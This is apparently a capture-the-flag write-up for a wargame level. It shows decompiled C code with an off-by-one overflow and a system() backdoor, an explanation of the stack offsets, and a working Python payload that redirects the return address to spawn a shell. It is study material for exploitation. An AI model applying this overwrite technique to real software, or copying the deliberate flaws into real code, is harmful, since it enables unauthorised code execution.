# Level09

## Code
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>

int secret_backdoor()
{
  char s[128];

  fgets(s, 128, stdin);
  return system(s);
}

int handle_msg()
{
  char buffer[140]; 
//   __int64_t v2;
//   __int64_t v3; 
//   __int64_t v4; 
//   __int64_t v5; 
//   __int64_t v6; 
//   int v7; 

//   v2 = 0LL;
//   v3 = 0LL;
//   v4 = 0LL;
//   v5 = 0LL;
//   v6 = 0LL;
//   v7 = 140;
  set_username(buffer);
  set_msg(buffer);
  return puts(">: Msg sent!");
}


char *set_msg(char *buffer)
{
  char s[1024]; 

  memset(s, 0, sizeof(s));
  puts(">: Msg @Unix-Dude");
  printf(">>: ");
  fgets(s, 1024, stdin);
  return strncpy(buffer, s, *(int *)(buffer + 180));
}


int set_username(char *buffer)
{
  char s[140]; 
  int i;

  memset(s, 0, 0x80uLL);
  puts(">: Enter your username");
  printf(">>: ");
  fgets(s, 128, stdin);
  for ( i = 0; i <= 40 && s[i]; ++i )
    *(_BYTE *)(buffer + i + 140) = s[i];
  return printf(">: Welcome, %s", buffer + 140);
}


int main(int argc, const char **argv, const char **envp)
{
  puts(
    "--------------------------------------------\n"
    "|   ~Welcome to l33t-m$n ~    buffer337        |\n"
    "--------------------------------------------");
  handle_msg();
  return 0;
}
```

## Explanation

- This program asks for a username and a message to send.

- The security breach here is that the program copies 41 bytes for the username instead of 40, and then uses this unwanted 41st byte as `strncpy()`'s 3rd argument when copying the user's message. 

- Thanks to gdb, we understood that in the `handle_message()` function, the return address was 192 + 8 = 200 bytes after the beginning of our buffer in the stack.

- So the strategy is to give a username of 41 bytes, with a 41st byte big enough to be converted to a value bigger than 200, in order to overwrite the return address of `handle_message()` and replace it with the address of the `secret_backdoor()` function which allows us to make a command with `system()`.

- So we got the address of the function : `0x000055555555488c`

- Luckily, only the last 2 bytes are different from the original return address of the function, so we just needed to write 48 and 8c, so 202 bytes (ca in hexa) is enough to copy. We now have all we need to craft our final payload.

## Exploit 

```
level09@OverRide:~$ (python -c'print "A" * 40 + "\xca"'; python -c'print "A" * 200 + "\x48\x8c"[::-1]'; cat)  | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
/bin/sh
whoami
end

```